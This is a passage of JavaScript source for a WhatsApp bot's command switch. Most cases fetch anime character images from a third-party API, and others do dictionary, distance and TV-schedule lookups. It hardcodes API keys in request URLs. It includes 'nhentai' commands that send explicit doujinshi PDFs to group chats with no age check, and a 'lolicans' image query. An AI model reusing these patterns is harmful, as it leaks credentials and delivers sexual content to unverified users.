              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Armin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'bertholdt': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=bertholdt`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Bertholdt', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'erwin': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=erwin`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Erwin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'lolicans': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=lolicans`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Lolicans', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'annie': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=annie`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'annie', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'jean': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=jean`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jean', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'connie': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=connie`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Connie', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'historia': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=historia`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Historia', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'sasha': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sasha`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasha', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'boruto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=boruto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Boruto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'sarada': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sarada`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sarada', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'sasuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sasuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================      
case 'sasuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sasuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break    
//============================================= 
case 'madara': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=madara`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Madara', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break   
//============================================= 
case 'obito': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=obito`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Obito', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'kanao': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=kanao`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Kanao', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'sayu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sayu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'sayu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
					
case 'yoshida': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=yoshida`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yoshida', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'airi': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=airi`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Airi', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'asami': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=asami`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Asami', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'yuzuha': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=yuzuha`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yuzuha', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'luffy': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=luffy`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Luffy', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'hashimoto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=hashimoto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Hashimoto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'tanLarasCans': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=tanLarasCans`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'TanLarasCans', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'nezuko': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=nezuko`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Nezuko', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'ichika': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=ichika`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ichika', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'zenitsu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=zenitsu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Zenitsu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'giyu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=giyu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Giyu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'sakonji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sakonji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sakonji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================         
case 'inosuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=inosuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Inosuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'zoro': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=zoro`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Zoro', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'sanji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sanji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'sanji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'gon': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=gon`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Gon', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'killua': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=killua`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Killua', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'sagiri': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=sagiri`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sagiri', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'taiko': case 'natsu': case 'genos': case 'saitama': case 'miku':
  kontoll = args.join (' ')
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${settings.lolkey}&query=${kontoll}`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'NEXT', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break 
//=============================================
case 'animefanart': 
					buff = await getBuffer(`https://api.lolhuman.xyz/api/random/animefanart?apikey=WannOff`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Animefanart', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'megumin': 
					buff = await getBuffer(`https://api.lolhuman.xyz/api/random/megumin?apikey=WannOff`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Megumin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: fniv})
              wann.relayWAMessage(prep)

					break  
					
					case 'kbbi':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=WannOff&query=${args.join(" ")}`)
               lila = get_result.result
               ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
               ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
               ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
               ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
               for (var x of lila) {
                   ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                   ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                   ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                   ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                   ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jarak':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
               pauls = args.join(" ")
               teks1 = pauls.split("-")[0].trim()
               teks2 = pauls.split("-")[1].trim()
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=WannOff&kota1=${teks1}&kota2=${teks2}`)
               x = get_result.result
               ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
               ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
               ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
               ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
               ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
               ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
               ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
               ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
               ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
               ini_txt += `   ╭───────────────❏\n`
               ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
               ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
               ini_txt += `❍┤ Mobil : ${x.mobil}\n`
               ini_txt += `❍┤ Motor : ${x.motor}\n`
               ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
               ini_txt += `   ╰───────────────❏\n`
               reply(ini_txt)
               break
//=========================================================
case 'urbandictionary':
if (!isGroup) return reply(mess.only.group)
               urb = args.join(" ")
               get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/urdict?apikey=WannOff&query=${urb}`)
               lilu = get_result.result
               for (var x of lilu) {
                   ini_txt = `\`\`\`Meaning :\n${x.definition}\`\`\`\n\n`
                   ini_txt += `\`\`\`Link : ${x.permalink}\`\`\`\n\n`
                   ini_txt += `\`\`\`Sounds Url : ${x.sound_urls[0]}\`\`\`\n\n`
                   ini_txt += `\`\`\`Like : ${x.thumbs_up}\`\`\`\n\n`
                   ini_txt += `\`\`\`Dislike : ${x.thumbs_down}\`\`\`\n\n`
                   ini_txt += `\`\`\`Created On : \n${x.written_on}\`\`\`\n\n`
                   ini_txt += `\`\`\`Author : ${x.author}\`\`\`\n\n`
                   ini_txt += `\`\`\`Word : ${x.word}\`\`\`\n\n`
                   ini_txt += `\`\`\`Defined Id : ${x.defid}\`\`\`\n\n`
                   ini_txt += `\`\`\`Example : ${x.example}\`\`\`\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jadwaltv':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
               channel = args[0]
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
               for (var x in get_result) {
                   ini_txt += `${x} - ${get_result[x]}\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jadwaltvnow':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = `Jadwal TV Now :\n`
  for (var x in get_result) {
      ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'jadwalbola':
if (!isGroup) return reply(mess.only.group)
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Jadwal Bola :\n"
  for (var x of get_result) {
      ini_txt += `Hari : ${x.hari}\n`
      ini_txt += `Jam : ${x.jam}\n`
      ini_txt += `Event : ${x.event}\n`
      ini_txt += `Match : ${x.match}\n`
      ini_txt += `TV : ${x.tv}\n\n`
  }
  reply(ini_txt)
  break
  case 'nhentaipdf':
            if (!isGroup) return reply(mess.only.group)
             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
             try {
             henid = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=WannOff`)
             get_result = get_result.result
             get_info = get_result.info
             teks = `*Doujinshi Downloader*

📜 Title Romaji : ${get_result.title_romaji}
📃 Title Native : ${get_result.title_native}
🐤 Character : ${get_info.characters.join(", ")}\n`
             ini_image = await getBuffer(get_result.image[0])
             wann.sendMessage(from, ini_image, image, { caption: teks, quoted: ftroli, thumbnail: fakeimage })
             reply(mess.wait)
             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=WannOff`)
             pdf = await getBuffer(anu.result)
             wann.sendMessage(from, pdf, document, { quoted: fniv, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
  case 'nhentai':
              if (!isGroup) return reply(mess.only.group)
              if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
              reply(mess.wait)
              henid = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=WannOff`)
              get_result = get_result.result
              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
              ini_txt += `Title Native : ${get_result.title_native}\n`
              ini_txt += `Read Online : ${get_result.read}\n`
              get_info = get_result.info
              ini_txt += `Parodies : ${get_info.parodies}\n`
              ini_txt += `Character : ${get_info.characters.join(", ")}\n`
              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
              ini_txt += `Artist : ${get_info.artists}\n`
              ini_txt += `Group : ${get_info.groups}\n`
              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
              ini_txt += `Categories : ${get_info.categories}\n`
              ini_txt += `Pages : ${get_info.pages}\n`
              ini_txt += `Uploaded : ${get_info.uploaded}\n`
              reply(ini_txt)
              break
//=========================================================
case 'heroml':
if (!isGroup) return reply(mess.only.group)
               if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
               hero = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/heroml/${hero}?apikey=IkyAds`)
               get_result = get_result.result
               ini_txt = `Name : ${get_result.hero_name}\n`
               ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
               ini_txt += `Role : ${get_result.detail.role}\n`
               ini_txt += `Specialty : ${get_result.detail.specialty}\n`
               ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
               ini_txt += `Release : ${get_result.detail.release_date}\n`
               ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
               ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
               ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
               ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
               ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
               ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
               ini_txt += `Hp : ${get_result.attr.hp}\n`
